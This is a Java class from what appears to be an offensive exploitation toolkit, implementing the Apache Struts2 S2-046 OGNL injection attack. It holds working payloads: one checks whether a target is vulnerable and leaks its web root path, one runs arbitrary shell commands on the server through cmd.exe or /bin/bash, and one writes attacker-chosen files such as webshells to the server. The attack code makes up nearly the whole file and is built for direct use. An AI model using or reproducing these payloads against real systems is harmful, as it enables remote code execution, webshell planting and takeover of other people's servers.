package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_046 implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private String check_payload = "------WebKitFormBoundaryJu2AMz9oOO1rTykn\r\n" +
            "Content-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('UUID')).(#res.getWriter().print('')).(#res.getWriter().print(#req.getSession().getServletContext().getRealPath('/'))).(#res.getWriter().flush()).(#res.getWriter().close())}\u0000b\"\r\n" +
            "Content-Type: text/plain\r\n" +
            "\r\n" +
            "test\r\n" +
            "------WebKitFormBoundaryJu2AMz9oOO1rTykn--\r\n";

    private String payload = "------WebKitFormBoundaryBxsps4jIWJ7XFGDD\r\n" +
            "Content-Disposition: form-data; name=\"test\"; filename=\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='payload').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\u0000b\"\r\n" +
            "Content-Type: text/plain\r\n" +
            "\r\n" +
            "test xxx\r\n" +
            "------WebKitFormBoundaryBxsps4jIWJ7XFGDD--\r\n";
    private String webPath;


    @Override
    public String checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();

        this.headers.put("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryJu2AMz9oOO1rTykn");
        String data = this.check_payload.replace("UUID", uuid);
        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            this.webPath = Tools.regReplace(response.getText().replace(uuid, ""));
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    @Override
    public String exeCmd(String cmd, String encoding) {

        String data = this.payload.replace("payload", cmd);
        this.headers.put("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryBxsps4jIWJ7XFGDD");
        Response response = HttpTools.post(this.target, data, headers, encoding);
        return response.getText();
    }

    @Override
    public String getWebPath() {
        return this.webPath;
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {

        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "------WebKitFormBoundaryDpxd5NY6NhpFBen1\r\n" +
                "Content-Disposition: form-data; name=\"test\"; filename=\"%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#filecontent='SHELLContent').(new java.io.BufferedWriter(new java.io.FileWriter(#req.getSession().getServletContext().getRealPath('/SHELLPATH'))).append(new java.net.URLDecoder().decode(#filecontent,'UTF-8')).close()).(#res.getWriter().print('ok00')).(#res.getWriter().print('koK/')).(#res.getWriter().print(#req.getContextPath())).(#res.getWriter().flush()).(#res.getWriter().close())}\u0000b\"\r\n" +
                "Content-Type: text/plain\r\n" +
                "\r\n" +
                "test x\r\n" +
                "------WebKitFormBoundaryDpxd5NY6NhpFBen1--\r\n";

        payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);


        this.headers.put("Content-type", "multipart/form-data; boundary=----WebKitFormBoundaryDpxd5NY6NhpFBen1");
        Response response = HttpTools.post(this.target, payload, this.headers, "UTF-8");

        String result = response.getText();

        if(result.contains("ok00koK")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
